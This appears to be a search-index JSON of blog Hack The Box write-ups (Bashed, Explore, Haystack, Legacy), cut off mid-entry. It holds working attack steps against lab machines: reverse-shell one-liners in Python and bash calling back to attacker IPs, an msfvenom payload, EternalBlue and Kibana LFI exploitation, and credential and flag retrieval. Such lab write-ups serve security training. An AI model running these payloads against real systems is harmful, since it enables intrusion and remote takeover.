\n\nDownload the file: 10.10.10.147/myapp\n\n\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝"
  },
  {
    "objectID": "posts/2021-02-16-htb-writeup-bashed/2021-02-16-htb-writeup-bashed.html",
    "href": "posts/2021-02-16-htb-writeup-bashed/2021-02-16-htb-writeup-bashed.html",
    "title": "Bashed - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/bashed]# nmap -Pn -n -sCV 10.10.10.68 (master✱) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel’s Development Site\n\nDIRB: ==&gt; DIRECTORY: http://10.10.10.68/css/ ==&gt; DIRECTORY: http://10.10.10.68/dev/ ==&gt; DIRECTORY: http://10.10.10.68/fonts/ ==&gt; DIRECTORY: http://10.10.10.68/images/ + http://10.10.10.68/index.html (CODE:200|SIZE:7743) ==&gt; DIRECTORY: http://10.10.10.68/js/ ==&gt; DIRECTORY: http://10.10.10.68/php/ + http://10.10.10.68/server-status (CODE:403|SIZE:299) ==&gt; DIRECTORY: http://10.10.10.68/uploads/\nNIKTO: + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS + /config.php: PHP Config file may contain database IDs and passwords.\n\nEnumerating the dirb results we quickly find http://10.10.10.68/dev/phpbash.php, a responsive webshell.\nwww-data@bashed:/var/www/html/dev# whoami www-data\nwww-data@bashed:/var/www/html/dev# cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:110::/var/run/dbus:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash\nwww-data@bashed:/home/arrexel# cat user.txt 2c281f318555dbc1b856957c7147bfc1\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nInvestigate if we can run anything as root.\nwww-data@bashed:/home# sudo -l\nMatching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\nUser www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL\nwww-data@bashed:/# sudo -u scriptmanager ls -al /scripts total 16 drwxrwxr– 2 scriptmanager scriptmanager 4096 Dec 4 2017 . drwxr-xr-x 23 root root 4096 Dec 4 2017 .. -rw-r–r– 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py -rw-r–r– 1 root root 12 Feb 23 05:22 test.txt\nwww-data@bashed:/# sudo -u scriptmanager cat /scripts/test.py f = open(“test.txt”, “w”) f.write(“testing 123!”) f.close\nwww-data@bashed:/# sudo -u scriptmanager cat /scripts/test.txt testing 123!\nAs we can see from the ls-output above, test.txt is owned by root, maybe the script test.py is ran as root by a cronjob? Modify the script with a python one-liner, setup a local listener and wait.\nwww-data@bashed:/# sudo -u scriptmanager echo ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.14.10”,4499));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,“-i”]);’ &gt; test.py [root:/git/htb/bashed]# nc -lvnp 4499 (master✱) listening on [any] 4499 … connect to [10.10.14.10] from (UNKNOWN) [10.10.10.68] 40690 /bin/sh: 0: can’t access tty; job control turned off # whoami root # cat /root/root.txt cc4f0afe3a1026d402ba10329674a8e2\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝"
  },
  {
    "objectID": "posts/2021-07-12-htb-writeup-explore/2021-07-12-htb-writeup-explore.html",
    "href": "posts/2021-07-12-htb-writeup-explore/2021-07-12-htb-writeup-explore.html",
    "title": "Explore - Hack The Box",
    "section": "",
    "text": "██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:~]# nmap -Pn -n -sCV –open 10.10.10.247 PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port2222-TCP:V=7.91%I=7%D=7/12%Time=60EC0C84%P=x86_64-pc-linux-gnu%r(NU SF:LL,24,“SSH-2.0-SSH20Server-20Banana20Studio”);\n\n[root:~]# nmap -p- –open 10.10.10.247 PORT STATE SERVICE 2222/tcp open EtherNetIP-1 42135/tcp open unknown 46285/tcp open unknown 59777/tcp open unknown\n[root:~]# nmap -sU –open 10.10.10.247 PORT STATE SERVICE 1900/udp open|filtered upnp 5353/udp open|filtered zeroconf\n\nGoogling about the unknown ports we quickly discover that 42135 & 59777 = ES File Explorer - which fits the name of the box.\n\nThere are numerous vulns out there for ES File Explorer, even a MSF module, however firing them off the shelf gives me response 500 error. After wasting a good amount of time with this error, I found that this is unintended and you should restart the box until it works.\n[root:/git/htb/explore]# curl –header “Content-Type: application/json” –request POST –data “{”command”:getDeviceInfo}” http://10.10.10.247:59777 -vvv Note: Unnecessary use of -X or –request, POST is already inferred. * Trying 10.10.10.247:59777… * Connected to 10.10.10.247 (10.10.10.247) port 59777 (#0) &gt; POST / HTTP/1.1 &gt; Host: 10.10.10.247:59777 &gt; User-Agent: curl/7.74.0 &gt; Accept: / &gt; Content-Type: application/json &gt; Content-Length: 23 &gt; * upload completely sent off: 23 out of 23 bytes * Mark bundle as not supporting multiuse * HTTP 1.0, assume close after body &lt; HTTP/1.0 200 OK &lt; Content-Type: text/plain &lt; Date: Mon, 12 Jul 2021 08:47:41 GMT &lt; Content-Length: 73 &lt; * Closing connection 0 {“name”:“VMware Virtual Platform”, “ftpRoot”:“/sdcard”, “ftpPort”:“3721”}\nThe vulnerability now works, to automate the process download a poc script and go at it.\n[root:/git/htb/explore]# python3 rce.py –cmd listPics –ip 10.10.10.247 (master✱) [*] Executing command: listPics on 10.10.10.247 [*] Server responded with: 200\n{\"name\":\"concept.jpg\", \"time\":\"4/21/21 02:38:08 AM\", \"location\":\"/storage/emulated/0/DCIM/concept.jpg\", \"size\":\"135.33 KB (138,573 Bytes)\", },\n{\"name\":\"anc.png\", \"time\":\"4/21/21 02:37:50 AM\", \"location\":\"/storage/emulated/0/DCIM/anc.png\", \"size\":\"6.24 KB (6,392 Bytes)\", },\n{\"name\":\"creds.jpg\", \"time\":\"4/21/21 02:38:18 AM\", \"location\":\"/storage/emulated/0/DCIM/creds.jpg\", \"size\":\"1.14 MB (1,200,401 Bytes)\", },\n{\"name\":\"224_anc.png\", \"time\":\"4/21/21 02:37:21 AM\", \"location\":\"/storage/emulated/0/DCIM/224_anc.png\", \"size\":\"124.88 KB (127,876 Bytes)\"}\n‘creds.jpg’ sounds like a great picture, download it.\n[root:/git/htb/explore]# python3 rce.py –get-file /storage/emulated/0/DCIM/creds.jpg –ip 10.10.10.247 (master✱) [*] Getting file: /storage/emulated/0/DCIM/creds.jpg from: 10.10.10.247 [*] Server responded with: 200 [*] Writing to file: creds.jpg\nCREDS = kristi:Kr1sT!5h@Rp3xPl0r3!\n\nLogin with SSH and grab user.txt\n\n[root:~]# ssh kristi@10.10.10.247 -p 2222 Password authentication Password: :/ $ id uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768 :/ $ cd sdcard :/sdcard $ cat user.txt f32017174c7c7e8f50c6da52891ae250\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nLooking on running port we find that 5555 is open locally. Reading about Android port 5555 we find that it’s used for Android Debug Bridge. ADB has an exploit where we can connect to it locally and get a root shell, sounds good!\n\n:/sdcard $ netstat -antup Active Internet connections (established and servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program Name .. tcp6 0 0 :::5555 :::* LISTEN -\n[root:~]# ssh -p 2222 -L 5555:localhost:5555 kristi@10.10.10.247 [root:/opt/scanners/linux]# adb connect localhost:5555 connected to localhost:5555 [root:/opt/scanners/linux]# adb devices List of devices attached emulator-5554 device localhost:5555 device [root:/opt/scanners/linux]# adb -s localhost:5555 shell x86_64:/ $ id uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0 x86_64:/ $ exit\n[root:/opt/scanners/linux]# adb root restarting adbd as root [root:/opt/scanners/linux]# adb -s localhost:5555 shell x86_64:/ # id uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:su:s0 x86_64:/ # find -L /data -name “root.txt” 2&gt;/dev/null /data/root.txt x86_64:/ # cat data/root.txt f04fc82b6d49b41c9b08982be59338c5\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nAndroid Open Ports: https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_06B-5_Wu_paper.pdf\nES File Explorer Vuln POC: https://github.com/fs0c131y/ESFileExplorerOpenPortVuln\nADB Exploit: https://allhacked.com/exploiting-android-through-adb/ https://stackoverflow.com/questions/14654718/how-to-use-adb-shell-when-multiple-devices-are-connected-fails-with-error-mor https://www.remosoftware.com/info/how-to-root-an-android-phone\nFind Command in Linux: https://www.linode.com/docs/guides/find-files-in-linux-using-the-command-line/"
  },
  {
    "objectID": "posts/2019-09-18-htb-writeup-haystack/2019-09-18-htb-writeup-haystack.html",
    "href": "posts/2019-09-18-htb-writeup-haystack/2019-09-18-htb-writeup-haystack.html",
    "title": "Haystack - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nnmap -Pn -sC -sV 10.10.10.115 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) 80/tcp open http nginx 1.12.2 9200/tcp open http nginx 1.12.2 |_http-server-header: nginx/1.12.2 |_http-title: 502 Bad Gateway\nDownload the image from http://10.10.10.115\nstrings needle.jpg shows base64 code at the end: bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==\nDecrypt gives us following Spanish text: la aguja en el pajar es “clave” .. or in English: the needle in the haystack is “key”\nhttp://10.10.10.115:9200 Clustername “elasticsearch” hints on how to move on. Googling elasticsearch gives the URI-syntax _search?q=WORD https://www.elastic.co/guide/en/elasticsearch/reference/current/search-uri-request.html\nhttp://10.10.10.115:9200/_search?q=clave “Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg” “I have to save the key for the machine: dXNlcjogc2VjdXJpdHkg”\n“Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=” “This key cannot be lost, I save it here: cGFzczogc3BhbmlzaC5pcy5rZXk=”\nDecrypt the keys (base64): dXNlcjogc2VjdXJpdHkg –&gt; user: security cGFzczogc3BhbmlzaC5pcy5rZXk= –&gt; pass: spanish.is.key\nSSH with user/pass given above. [security@haystack ~]$ whoami security [security@haystack ~]$ cd /home/security/ [security@haystack ~]$ ls -al total 16 drwx——. 2 security security 99 Feb 6 2019 . drwxr-xr-x. 3 root root 22 Nov 28 2018 .. lrwxrwxrwx. 1 root root 9 Jan 25 2019 .bash_history -&gt; /dev/null -rw-r–r–. 1 security security 18 Apr 10 2018 .bash_logout -rw-r–r–. 1 security security 193 Apr 10 2018 .bash_profile -rw-r–r–. 1 security security 231 Apr 10 2018 .bashrc -rw-r–r–. 1 security security 33 Feb 6 2019 user.txt [security@haystack ~]$ cat user.txt 04d*****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nScan system with lse to find vulns. Under “Processes running with root permissions” we can find a lot of output regarding logstash. Reading up on logstash it is used for Kibana. Kibana uses port 5601 which is running locally.\n[security@haystack shm]$ ./lse.sh -l1 [*] net000 Services listening only on localhost………………………. yes! tcp LISTEN 0 128 127.0.0.1:5601 :\nSetup a (remote) SSH tunnel to access the service from the attacking host. Remotly from Haystack: ssh -R 5601:127.0.0.1:5601 p3@10.10.14.7 Or locally from Kali: ssh -L 5601:localhost:5601 security@10.10.10.115\nOpen a web browser to http://127.0.0.1:5601 and you’ll reach Kibana.\nKibana runs version 6.4.2 and is vulnerable for LFI (CVE-2018-17246) https://github.com/mpgn/CVE-2018-17246\nUpload a .js reverse shell to /dev/shm, start netcat locally and run the LFI: http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../…/../../../dev/shm/node-rev.js\nWe don’t get immediate root access with user kibana, so better upgrade to a proper shell root@p3:/opt/shells# nc -lnvp 4488 listening on [any] 4488 … connect to [10.10.14.7] from (UNKNOWN) [10.10.10.115] 41040 whoami kibana cd /root /bin/sh: línea 3: cd: /root: Permiso denegado\nUsing lse.sh again we can see that dir /etc/logstash/conf.d is writable and has three interesting config files; filter.conf, input.conf, output.config input.conf looks for a file to execute every 10s in path /opt/kibana/ with filename logstash_*, however it must match the syntax of filter.conf\nCreate a reverse shell to be executed, matching input.conf and filter.conf bash-4.2$ echo “Ejecutar comando : bash -i &gt;& /dev/tcp/10.10.14.7/3366 0&gt;&1” &gt; /opt/kibana/logstash_p3.txt\nStart netcat and wait for the incoming root shell root@p3:/opt/shells$ nc -lnvp 3366 listening on [any] 3366 … connect to [10.10.14.7] from (UNKNOWN) [10.10.10.115] 60796 bash: no hay control de trabajos en este shell [root@haystack /]# whoami whoami root [root@haystack /]# cat /root/root.txt cat /root/root.txt 3f5******************************"
  },
  {
    "objectID": "posts/2019-04-14-htb-writeup-legacy/2019-04-14-htb-writeup-legacy.html",
    "href": "posts/2019-04-14-htb-writeup-legacy/2019-04-14-htb-writeup-legacy.html",
    "title": "Legacy - Hack The Box",
    "section": "",
    "text": "[root:/git/htb]# nmap -Pn -n -sCV 10.10.10.4 --open                                                                               (master✱)\n  PORT    STATE SERVICE      VERSION\n  139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn\n  445/tcp open  microsoft-ds Windows XP microsoft-ds\n  Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp\n\n  Host script results:\n  |_clock-skew: mean: 5d01h01m15s, deviation: 1h24m50s, median: 5d00h01m15s\n  |_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:11:0b (VMware)\n  | smb-os-discovery:\n  |   OS: Windows XP (Windows 2000 LAN Manager)\n  |   OS CPE: cpe:/o:microsoft:windows_xp::-\n  |   Computer name: legacy\n  |   NetBIOS computer name: LEGACY\\x00\n  |   Workgroup: HTB\\x00\n  |_  System time: 2021-03-01T12:38:45+02:00\n  | smb-security-mode:\n  |   account_used: &lt;blank&gt;\n  |   authentication_level: user\n  |   challenge_response: supported\n  |_  message_signing: disabled (dangerous, but default)\n  |_smb2-time: Protocol negotiation failed (SMB2)\n\n\n[root:/git/htb]# nmap -p139,445 --script vuln 10.10.10.4                                                                          (master✱)\n  PORT    STATE SERVICE\n  139/tcp open  netbios-ssn\n  445/tcp open  microsoft-ds\n\n  Host script results:\n  |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED\n  | smb-vuln-ms08-067:\n  |   VULNERABLE:\n  |   Microsoft Windows system vulnerable to remote code execution (MS08-067)\n  |     State: LIKELY VULNERABLE\n  |     IDs:  CVE:CVE-2008-4250\n  |           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,\n  |           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary\n  |           code via a crafted RPC request that triggers the overflow during path canonicalization.\n  |\n  |     Disclosure date: 2008-10-23\n  |     References:\n  |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250\n  |_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx\n  |_smb-vuln-ms10-054: false\n  |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)\n  | smb-vuln-ms17-010:\n  |   VULNERABLE:\n  |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n  |     State: VULNERABLE\n  |     IDs:  CVE:CVE-2017-0143\n  |     Risk factor: HIGH\n  |       A critical remote code execution vulnerability exists in Microsoft SMBv1\n  |        servers (ms17-010).\n  |\n  |     Disclosure date: 2017-03-14\n  |     References:\n  |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n  |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n  |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\nMS17-010 EternalBlue is the obvious attack path here, lets exploit it.\na) Download the script send_and_execute.py\nb) Create your malicious payload:\n`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4488 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe`\nc) Execute!\n[root:/git/htb/legacy]# python send_and_execute.py 10.10.14.10 ms17-010.exe                                                       (master✱)\n  Traceback (most recent call last):\n    File \"send_and_execute.py\", line 2, in &lt;module&gt;\n      from impacket import smb, smbconnection\n  ImportError: No module named impacket\n\nd) If you get the error like above, it’s because your python2 version is to new.\n\nd1) uninstall pip3: sudo apt-get remove python3-pip\n\n\nd2) Get pip3 installer: curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py\nd3) Install pip3: python3 get-pip.py\nd4) Get pip2 installer: curl https://bootstrap.pypa.io/2.7/get-pip.py -o get-pip.py\nd5) Install pip2: python get-pip.py\nd6) Now you can install any pip2 modules: pip install impacket\nd7) Make sure your python and python-pip are compatible. Python version 2.7.18 and pip 20.3.4 is preffered.\n[root:/git/htb/legacy]# python -m pip -V                                                                                          (master✱)\n  pip 20.3.4 from /usr/local/lib/python2.7/dist-packages/pip (python 2.7)\n\n[root:/git/htb/legacy]# python -V                                                                                                 (master✱)\n  Python 2.7.18\ne) EXECUTE EXPLOIT AGAIN!\n[root:/git/htb/legacy]# python send_and_execute.py 10.10.10.4 ms17-010.exe                                                        (master✱)\n  Trying to connect to 10.10.10.4:445\n  Traceback (most recent call last):\n    File \"send_and_execute.py\", line 1077, in &lt;module&gt;\n      exploit(target, port, pipe_name)\n    File \"send_and_execute.py\", line 794, in exploit\n      conn = MYSMB(target, port)\n    File \"/git/htb/legacy/mysmb.py\", line 118, in __init__\n      smb.SMB.__init__(self, remote_host, remote_host, timeout=timeout)\n    File \"/usr/local/lib/python2.7/dist-packages/impacket/smb.py\", line 2434, in __init__\n      self._sess = nmb.NetBIOSTCPSession(my_name, remote_name, remote_host, host_type, sess_port, self.__timeout)\n    File \"/usr/local/lib/python2.7/dist-packages/impacket/nmb.py\", line 893, in __init__\n      timeout=timeout, local_type=local_type, sock=sock)\n    File \"/usr/local/lib/python2.7/dist-packages/impacket/nmb.py\", line 752, in __init__\n      self._sock = self._setup_connection((remote_host, sess_port), timeout)\n    File \"/usr/local/lib/python2.7/dist-packages/impacket/nmb.py\", line 904, in _setup_connection\n      raise socket.error(\"Connection error (%s:%s)\" % (peer[0], peer[1]), e)\n  socket.error: [Errno Connection error (10.10.10.4:445)] timed out\nf) If above happens, reboot the box and execute a third time.\n[root:/git/htb/legacy]# python send_and_execute.py 10.10.10.4 ms17-010.exe                                                        (master✱)\n  Trying to connect to 10.10.10.4:445\n  Target OS: Windows 5.1\n  Using named pipe: browser\n  Groom packets\n  attempt controlling next transaction on x86\n  success controlling one transaction\n  modify parameter count to 0xffffffff to be able to write backward\n  leak next transaction\n  CONNECTION: 0x82208430\n  SESSION: 0xe1a57430\n  FLINK: 0x7bd48\n  InData: 0x7ae28\n  MID: 0xa\n  TRANS1: 0x78b50\n  TRANS2: 0x7ac90\n  modify transaction struct for arbitrary read/write\n  make this SMB session to be SYSTEM\n  current TOKEN addr: 0xe2116d30\n  userAndGroupCount: 0x3\n  userAndGroupsAddr: 0xe2116dd0\n  overwriting token UserAndGroups\n  Sending file KCC2VY.exe...\n  Opening SVCManager on 10.10.10.4.....\n  Creating service vteS.....\n  Starting service vteS.....\n  The NETBIOS connection with the remote host timed out.\n  Removing service vteS.....\n  ServiceExec Error on: 10.10.10.4\n  nca_s_proto_error\n  Done\n    [root:/opt/impacket]# nc -lvnp 4488                                                                                                (master)\n      listening on [any] 4488 ...\n      connect to [10.10.14.10] from (UNKNOWN) [10.10.10.4] 1031\n      Microsoft Windows XP [Version 5.1.2600]\n      (C) Copyright 1985-2001 Microsoft Corp.\n\n      C:\\WINDOWS\\system32&gt;\n\n      C:\\Documents and Settings\\john\\Desktop&gt;type user.txt\n        e69af0e4f443de7e36876fda4ec7644f\n\n      C:\\Documents and Settings\\Administrator\\Desktop&gt;type root.txt\n        993442d258b0e0ec917cae9e695d5713"
  },
  {
    "objectID": "posts/2019-04-14-htb-writeup-legacy/2019-04-14-htb-writeup-legacy.html#enumeration",
    "href": "posts/2019-04-14-htb-writeup-legacy/2019-04-14-htb-writeup-legacy.html#enumeration",
    "title": "Legacy - Hack The Box",
    "section": "",
    "text": "[root:/git/htb]# nmap -Pn -n -sCV 10.10.10.4 --open                                                                               (master✱)\n  PORT    STATE SERVICE      VERSION\n  139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn\n  445/tcp open  microsoft-ds Windows XP microsoft-ds\n  Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp\n\n  Host script results:\n  |_clock-skew: mean: 5d01h01m15s, deviation: 1h24m50s, median: 5d00h01m15s\n  |_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:11:0b (VMware)\n  | smb-os-discovery:\n  |   OS: Windows XP (Windows 2000 LAN Manager)\n  |   OS CPE: cpe:/o:microsoft:windows_xp::-\n  |   Computer name: legacy\n  |   NetBIOS computer name: LEGACY\\x00\n  |   Workgroup: HTB\\x00\n  |_  System time: 2021-03-01T12:38:45+02:00\n  | smb-security-mode:\n  |   account_used: &lt;blank&gt;\n  |   authentication_level: user\n  |   challenge_response: supported\n  |_  message_signing: disabled (dangerous, but default)\n  |_smb2-time: Protocol negotiation failed (SMB2)\n\n\n[root:/git/htb]# nmap -p139,445 --script vuln 10.10.10.4                                                                          (master✱)\n  PORT    STATE SERVICE\n  139/tcp open  netbios-ssn\n  445/tcp open  microsoft-ds\n\n  Host script results:\n  |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED\n  | smb-vuln-ms08-067:\n  |   VULNERABLE:\n  |   Microsoft Windows system vulnerable to remote code execution (MS08-067)\n  |     State: LIKELY VULNERABLE\n  |     IDs:  CVE:CVE-2008-4250\n  |           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,\n  |           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary\n  |           code via a crafted RPC request that triggers the overflow during path canonicalization.\n  |\n  |     Disclosure date: 2008-10-23\n  |     References:\n  |       